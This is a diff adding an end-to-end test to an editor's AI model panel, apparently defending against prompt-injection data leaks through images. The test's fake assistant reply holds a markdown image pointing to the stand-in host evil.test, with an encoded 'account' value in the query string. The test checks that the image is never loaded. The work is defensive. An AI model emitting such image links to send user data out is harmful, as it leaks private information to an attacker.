@@ -578,3 +578,34 @@ test("回答寫回文件：按鈕有文字；插入到游標處、加到最後�
   assert.deepEqual(errors, []);
   await context.close();
 });
+
+test("回答裡的遠端圖片一律不載入（就算關掉「封鎖遠端圖片」）：被藏在文件裡的指示操控時，資料不會跟著圖片網址送出去", async () => {
+  // 關掉「封鎖遠端圖片」：文件預覽會載入遠端圖片，但助理的回答照樣不載入。
+  const { page, context, errors, external } = await open({ desktop: desktop({ ...ON, blockRemoteImages: false }) });
+  await openProject(page);
+  await page.keyboard.press("Control+N");
+  await page.locator(".cm-content").waitFor({ state: "visible" });
+  await setText(page, "會議紀錄");
+  await page.locator(".cm-content").focus();
+  await page.keyboard.press("Control+Shift+L");
+  const panel = page.locator("#assistant-panel");
+  await panel.waitFor();
+  await panel.locator(".assistant-input textarea").fill("整理一下");
+  await panel.locator(".assistant-input textarea").press("Enter");
+  const confirm = page.locator("dialog.choice[open]");
+  await confirm.waitFor();
+  await confirm.getByRole("button", { name: "送出" }).click();
+  await page.waitForFunction(() => window.__fake.calls.some((c) => c.cmd === "assistant_send"));
+  await reply(page, "整理好了。\n\n![進度](https://evil.test/p.png?d=%E5%B8%B3%E8%99%9F)");
+  const answer = panel.locator(".assistant-assistant").last();
+  const img = answer.locator("img");
+  await img.waitFor({ state: "attached" });
+  assert.equal(await img.getAttribute("src"), null, "圖片沒有網址");
+  assert.equal(await img.getAttribute("data-blocked-src"), "https://evil.test/p.png?d=%E5%B8%B3%E8%99%9F");
+  // 這裡沒有「按一下載入」：提示只有原本的網址。
+  assert.equal(await img.getAttribute("title"), "https://evil.test/p.png?d=%E5%B8%B3%E8%99%9F");
+  await page.waitForTimeout(300);
+  assert.deepEqual(external.filter((u) => u.includes("evil.test")), [], "沒有連到對方的伺服器");
+  assert.deepEqual(errors, []);
+  await context.close();
+});
